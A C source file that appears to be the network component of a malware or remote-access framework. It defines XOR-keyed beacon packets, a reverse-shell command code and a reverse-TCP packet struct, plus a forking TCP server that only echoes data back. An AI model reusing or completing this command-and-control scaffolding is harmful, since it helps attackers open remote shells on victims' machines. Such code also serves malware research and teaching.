/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include "../defs.h"
#include "../stub/shell.h"

#ifndef NET_BACKLOG_COUNT
#define NET_BACKLOG_COUNT 4
#endif

#ifndef NET_PACKET_MAX_SIZE
#define NET_PACKET_MAX_SIZE 1024
#endif

#ifndef NET_COMMANDS
#define NET_COMMAND_HELLO         0
#define NET_COMMAND_REVERSE_SHELL 1
#define NET_COMMANDS
#endif

#ifndef NET_PACKET_BEACON
typedef struct{
  int xor_key;
  int command;
} net_packet_beacon_t;
#define NET_PACKET_BEACON 0
#endif

#ifndef NET_PACKET_CMD_REVERSE_TCP
typedef struct{
  net_packet_beacon_t header;
  shell_reverse_tcp_args_t args;
} net_packet_cmd_reverse_tcp_t;
#define NET_PACKET_CMD_REVERSE_TCP
#endif

#ifndef NET_START_SERVER_ARGS
typedef struct{
  int port;
} net_start_server_args_t;
#define NET_START_SERVER_ARGS
#endif

bool net_start_server(int port){
  /*
    :TODO: start listening server
    :port: (int) server listening port
    :returns: (bool)
  */
  if (port < TCP_PORT_MIN || port > TCP_PORT_MAX){
    fprintf(stderr, "[-] server port is invalid\n");
    return false;
  }

  int server_fd, client_fd, err;
  struct sockaddr_in server, client;
  char data[NET_PACKET_MAX_SIZE];
  pid_t child_pid;

  // setup socket
  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd < 0){
    fprintf(stderr, "[-] server error creating socket\n");
    return false;
  }
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = htonl(INADDR_ANY);

  // bind to socket
  err = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
  if (err < 0){
    fprintf(stderr, "[-] bind to socket failed\n");
    return false;
  }

  printf("[+] bind to port %d\n", ntohs(server.sin_port));

  // listener
  if (listen(server_fd, 128)  == 0){
    printf("[*] listening...\n");
  } else{
    fprintf(stderr, "[-] listen to socket failed\n");
  }
  
  while (true){
    // accept client connection
    socklen_t client_len = sizeof(client);
    client_fd = accept(server_fd, (struct sockaddr *) &client, &client_len);
    if (client_fd < 0){
      printf("[+] %s:%d disconnected\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
      return false;
    } else{
      printf("[+] %s:%d connected\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
    }
    if ((child_pid = fork()) == 0){
      while (true){
        close(server_fd);
        int read = recv(client_fd, data, NET_PACKET_MAX_SIZE, 0);
        if (!read){
          break;
        }
        if (read < 0){
          fprintf(stderr, "[-] client read failed\n");
          return false;
        }
        err = send(client_fd, data, read, 0);
        if (err < 0){
          fprintf(stderr, "[-] client write failed\n");
          return false;
        }
      }
    }
  }
  close(client_fd);
  return true;
}
